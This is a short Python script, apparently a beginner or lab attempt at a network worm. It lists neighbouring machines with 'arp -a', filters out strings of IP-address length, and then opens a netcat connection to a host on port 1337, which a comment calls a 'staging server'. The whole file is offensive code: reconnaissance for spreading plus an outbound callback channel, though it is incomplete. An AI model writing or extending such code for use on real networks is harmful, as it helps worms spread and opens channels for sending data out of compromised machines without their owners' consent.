#!/usr/bin/env python

import subprocess

def worm_spread():
 
    machines = subprocess.check_output(["arp", "-a"])
    print(machines)

    machine_list = machines.split()

    for i in machine_list:
        #parse for ip addresses- contain more than 13 charac but less than 17
        if len(i) > 13 and len(i) < 17:
            print(i)

(worm_spread())


def nc_listener():
    #sending to staging server via netcat
    subprocess.call(["nc", "192.168.56.101", "1337"])
print(nc_listener())
